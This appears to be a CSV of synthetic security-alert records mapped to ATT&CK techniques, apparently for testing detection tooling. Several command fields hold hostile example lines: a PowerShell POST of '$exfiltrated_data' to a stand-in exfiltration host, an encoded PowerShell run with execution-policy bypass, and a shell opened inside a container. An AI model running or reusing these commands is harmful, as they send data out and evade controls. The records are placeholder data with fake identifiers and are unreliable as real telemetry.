123456789,,2023-03-06T14:30:00Z,,,,Automated Exfiltration,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,Defender for Endpoint,,,,,,,,explorer.exe,explorer.exe C:\Users\user1\Desktop\confidential.docx,,,192.168.1.100,user1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'RuleName': 'Block Exfiltration', 'RuleAction': 'Block', 'RuleID': 12345, 'NetworkProtocol': 'TCP', 'RemoteIP': '10.0.0.2', 'RemotePort': 8080}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,00-11-22-33-44-55,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.",Microsoft-Windows-Windows Firewall With Advanced Security/Firewall,Windows Firewall has blocked an application from accessing the network,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lkkkkjl0,,2023-03-10T12:00:00Z,,,,Domain Policy Modification,Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments,,,,,,Domain Policy Modification,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Domain Policy,example-policy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,example-host,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
lllkld0,,2023-03-09T12:00:00.000000Z,,,,Fallback communication channel,Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.,,,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,,,,,,,,,,,powershell.exe,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA=,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,80,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,HTTP,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040607,,2023-03-09T12:00:00.000000Z,,,,Ingress Tool,Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp.,,,,,,Ingress Tool Transfer,,,,,,,,,,,,,,,,,Medium,,,EDR,,,,,,,,,,,,,,Initial Access,,,,powershell.exe,powershell.exe -NoProfile -ExecutionPolicy unrestricted -EncodedCommand ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,57234,10.0.2.15,443,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MDE-34567,,2022-10-31T15:23:45Z,,,,File or process modification,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files\OpenSSH\sshd.exe,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Modified OpenSSH binary detected on host SERVER-ABC,2022-10-31T14:45:00Z,A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0,B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6Q7R8S9T0U1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,2023-03-08T14:30:00Z,,,,Scheduled Transfer,"This alert is triggered when a file transfer occurs, which may indicate scheduled transfer activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,cmd.exe,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
03040506078,,2023-03-10T12:00:00Z,,,,Access Token Compromise,Indications of Access Token Manipulation activity have been found on the endpoint.,,,,,,Access Token Manipulation,,,,,,,,,,,,,,,,,High,,,,,Endpoint Detection and Response,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Windows 10 Pro,,,,,,,,,,,,,,,,,,,,,,,,,JohnDoe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,endpoint1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EDR-13579,,2022-10-31T23:59:59Z,,,,Bowser Extension,A suspicious browser extension detected on host DESKTOP-123 was installed on Google Chrome,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'DESKTOP-123', 'ip_address': '192.168.1.100'}",Suspicious Activity,Remove the suspicious browser extension from the host,"{'extension_name': 'Malicious Extension', 'extension_publisher': 'Unknown', 'browser_name': 'Google Chrome', 'browser_version': '95.0.4638.69', 'extension_path': 'C:\\Program Files\\Google\\Chrome\\Extensions\\maliciousextension'}",,,,,,,,,,,,,,,,,,,,,,,,,,,
334566777,,2023-03-10T12:00:00Z,,,,Debugger Evasion,Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment.,,,,,High,Debugger Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the process %process_name% for signs of malicious activity.,,,,,,,,,,,,,,,,,Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Debugger Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,
99782345,,2022-03-15T10:30:00Z,,,,Potential website defacement,"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion.",,,,,,,,,C:\inetpub\wwwroot\index.html,,,iexplore.exe https://example.com/,,,,,,,,,,,High,,,Behavior,,Web,,,,,,,,EDR,,,,,,,,C:\Windows\System32\iexplore.exe,,,,,,,,,,,,,,,example-device,123456,Windows,10.0.19042,2022-03-15T10:15:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\SysWOW64\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,Web,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,Exfiltration Over Web Service,"This alert is triggered when there is suspicious network traffic that indicates exfiltration over a web service. This could be an indication of data exfiltration, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,High,,,,,,12345678-1234-1234-1234-123456789012,,,,,,,Microsoft Defender for Endpoint,,,,,,,,explorer.exe,powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,T1567,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-08T14:30:00Z,http://exfiltration-server.com,POST,,,,,,,,,,,,,,,,,,,,,
33456678,,2023-03-10T15:00:00.000Z,,,,Deobfuscate-Decode Files,"An adversary may use Obfuscation or Encoding to hide or obscure the content of files or other information they are exfiltrating. These obfuscation and encoding techniques include ASCII, Base64, binary-to-text encoding, and others.",,,,,,Deobfuscate/Decode Files or Information,,,,,,,,,,,,,,,,,High,,,,,Malware,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the endpoint for any signs of malicious activity.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,,2022-02-28T09:15:00Z,high,endpoint,,Unusual Connection Attempt,"Analysis of processes running has detected an uncommon connection attempt through applications layer protocol. This is very rare in normal operations, but a known technique for attackers attempting to bypass network-layer detections.",,,,,,,,,,,,,,,EDR,Command and Control,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,443,,,HTTPS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Application Layer Protocol,192.168.1.100,,,,,,,,,,,,,,,,,,,
0093345,,,,,,container administration,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.",,,,,,,,,,,,,,,,,,,,,,,High,,,EDR,,Behavioral,,,{},,New,,,Machine,,,,,,,,,docker exec -it mycontainer /bin/sh,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mydomain.com,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,10.0.19041.1237,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,604800.0,2022-12-31T23:59:59Z,Behavior,false,2022-12-31T23:59:59Z,mycomputer.mydomain.com,mycomputer.mydomain.com,MYCOMPUTER,Windows 10 Enterprise,x64,2022-12-31T23:45:00Z,2022-12-31T23:59:59Z,DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,dockerd.exe,2022-12-31T23:45:00Z,Microsoft,High,Forced Container Administration Command
